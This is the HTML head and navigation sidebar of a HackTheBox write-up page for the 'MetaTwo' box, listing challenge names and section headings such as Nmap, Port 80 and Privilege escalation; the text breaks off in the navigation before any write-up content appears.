
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="MetaTwo box from HackTheBox write up.">
      
      
        <meta name="author" content="Ángel Heredia">
      
      
        <link rel="canonical" href="https://anthares101.com/HackTheBox/MetaTwo/">
      
      
        <link rel="prev" href="../Meta/">
      
      
        <link rel="next" href="../Netmon/">
      
      
      <link rel="icon" href="../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.17">
    
    
      
        <title>MetaTwo - Anthares WriteUps</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.bcfcd587.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  <!-- Determine title -->
  
  
    
  

  <!-- Determine description -->
  
  
    
  

  <!-- The image needs to have an absolute URL -->
  
  

  <!-- Open graph meta tags -->
  <meta property="og:type" content="website" />
  <meta property="og:title" content="MetaTwo - Anthares WriteUps" />
  <meta property="og:description" content="MetaTwo box from HackTheBox write up." />
  <meta property="og:url" content="https://anthares101.com/HackTheBox/MetaTwo/" />
  <meta property="og:image" content="https://anthares101.com/assets/banner.png" />
  <meta property="og:image:alt" content="Page banner with the site name and a flag logo" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="1200" />

  <!-- Twitter meta tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:site" content="@Anthares101" />
  <meta name="twitter:creator" content="@Anthares101" />
  <meta name="twitter:title" content="MetaTwo - Anthares WriteUps" />
  <meta name="twitter:description" content="MetaTwo box from HackTheBox write up." />
  <meta name="twitter:image" content="https://anthares101.com/assets/banner.png" />
  <meta name="twitter:image:alt" content="Page banner with the site name and a flag logo" />

  <!-- Cloudflare Web Analytics -->
  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "0eec0c6a58a84bcea4130feee244a950"}'></script>
  <!-- End Cloudflare Web Analytics -->

  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#metatwo" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Anthares WriteUps" class="md-header__button md-logo" aria-label="Anthares WriteUps" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.4 6 14 4H5v17h2v-7h5.6l.4 2h7V6h-5.6Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Anthares WriteUps
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              MetaTwo
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  Welcome!

      </a>
    </li>
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../CTFs/" class="md-tabs__link">
        
  
    
  
  CTFs

      </a>
    </li>
  

      
        
  
  
    
  
  
    <li class="md-tabs__item md-tabs__item--active">
      <a href="../" class="md-tabs__link">
        
  
    
  
  HackTheBox

      </a>
    </li>
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../TryHackMe%21/" class="md-tabs__link">
        
  
    
  
  TryHackMe!

      </a>
    </li>
  

      
      <li class="md-tabs__item">
        <a href="https://blog.anthares101.com/" class="md-tabs__link" target="_blank">
          <span class="twemoji md-social__link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Pro 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M64 496C64 504.8 56.75 512 48 512h-32C7.25 512 0 504.8 0 496V32c0-17.75 14.25-32 32-32s32 14.25 32 32V496zM476.3 0c-6.365 0-13.01 1.35-19.34 4.233c-45.69 20.86-79.56 27.94-107.8 27.94c-59.96 0-94.81-31.86-163.9-31.87C160.9 .3055 131.6 4.867 96 15.75v350.5c32-9.984 59.87-14.1 84.85-14.1c73.63 0 124.9 31.78 198.6 31.78c31.91 0 68.02-5.971 111.1-23.09C504.1 355.9 512 344.4 512 332.1V30.73C512 11.1 495.3 0 476.3 0z"/></svg></span>Raptor Blog
        </a>
      </li>
    </ul>
  </div>
</nav>

          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Anthares WriteUps" class="md-nav__button md-logo" aria-label="Anthares WriteUps" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.4 6 14 4H5v17h2v-7h5.6l.4 2h7V6h-5.6Z"/></svg>

    </a>
    Anthares WriteUps
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome!
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTFs/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    CTFs
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            CTFs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTFs/DEADFACE_CTF_2021/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    DEADFACE CTF 2021
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            DEADFACE CTF 2021
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/DEADFACE_CTF_2021/Blood_Bash_3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blood Bash 3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/DEADFACE_CTF_2021/Cereal_Killer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cereal Killer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/DEADFACE_CTF_2021/File_101/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File 101
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/DEADFACE_CTF_2021/Old_Devil/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Old Devil
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/DEADFACE_CTF_2021/The_Count/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    The Count
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/DEADFACE_CTF_2021/The_Root_of_All_Evil/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    The Root of All Evil
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTFs/H%40cktivityCon_2021/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    H@cktivityCon 2021
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            H@cktivityCon 2021
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/H%40cktivityCon_2021/Bad_Words/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bad Words
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/H%40cktivityCon_2021/ButterOverflow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ButterOverflow
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/H%40cktivityCon_2021/Confidentiality/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Confidentiality
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/H%40cktivityCon_2021/N1P/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    N1P
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTFs/HacktoberCTF_2020/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    HacktoberCTF 2020
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            HacktoberCTF 2020
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/HacktoberCTF_2020/PasswordCheck/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PasswordCheck
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/HacktoberCTF_2020/TalkingToTheDead/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    TalkingToTheDead
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTFs/Nahamcon_2021/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Nahamcon 2021
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Nahamcon 2021
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/Nahamcon_2021/%24Echo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    $Echo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/Nahamcon_2021/AgentTesterV1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AgentTesterV1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/Nahamcon_2021/Asserted/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Asserted
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/Nahamcon_2021/HomewardBound/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HomewardBound
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/Nahamcon_2021/MeetTheTeam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MeetTheTeam
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/Nahamcon_2021/esab64/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    esab64
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTFs/Reply_CTF_Challenge%202020/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Reply CTF Challenge 2020
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            Reply CTF Challenge 2020
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTFs/Reply_CTF_Challenge%202020/Hide%26eXec/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hide & eXec [300]
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    HackTheBox
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            HackTheBox
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Active/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Admirer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Admirer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Ambassador/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ambassador
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Baby_Ninja_Jinja/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Baby Ninja Jinja
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Base/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Base
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Bashed/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bashed
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Beep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Beep
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Bitlab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bitlab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Blue/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blue
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Blunder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blunder
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Book/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Book
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Brainfuck/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Brainfuck
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Catch/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Catch
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Cronos/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cronos
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Delivery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Delivery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Forest/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forest
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Giddy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Giddy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Guard/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Guard
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Included/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Included
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Jarvis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Jarvis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Jerry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Jerry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../LaCasaDePapel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LaCasaDePapel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Lame/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lame
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Little_Tommy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Little Tommy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Markup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Markup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Meta/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Meta
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    MetaTwo
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    MetaTwo
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-80" class="md-nav__link">
    <span class="md-ellipsis">
      Port 80
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-21" class="md-nav__link">
    <span class="md-ellipsis">
      Port 21
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#inside-the-machine-as-jnelson" class="md-nav__link">
    <span class="md-ellipsis">
      Inside the machine as jnelson
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inside the machine as jnelson">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege escalation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Netmon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Netmon
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Nibbles/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nibbles
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Noter/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Noter
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Oopsie/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Oopsie
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OpenSource/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OpenSource
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../P.O.O./" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    P.O.O.
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Paper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Paper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
